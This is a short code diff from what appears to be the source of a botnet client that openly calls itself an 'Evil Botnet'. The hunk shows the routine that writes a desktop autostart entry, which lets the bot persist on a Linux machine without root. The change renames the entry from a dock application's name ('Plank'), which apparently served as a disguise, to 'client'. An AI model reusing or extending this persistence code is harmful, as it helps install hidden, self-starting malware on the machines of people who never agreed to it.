@@ -95,7 +95,7 @@ class client:
             # create the autostart .desktop, this is the only way to autostart without root permission
             # a desktop environment like gnome must be present and running on client machine
             file_content = "[Desktop Entry]\n" \
-                            "Name=Plank\n" \
+                            "Name=client\n" \
                             "GenericName=client\n" \
                             "Comment=Evil Botnet\n" \
                             "Categories=Utility;\n" \
